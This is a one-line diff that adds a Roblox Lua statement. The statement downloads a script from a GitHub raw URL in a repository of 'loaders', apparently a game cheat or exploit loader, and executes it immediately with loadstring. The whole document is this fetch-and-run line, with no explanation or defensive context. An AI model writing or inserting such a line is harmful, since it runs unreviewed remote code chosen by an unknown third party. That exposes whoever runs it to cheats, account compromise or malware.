@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/fps-flick-spam2-dest9u2pk5swzq.lua"))()
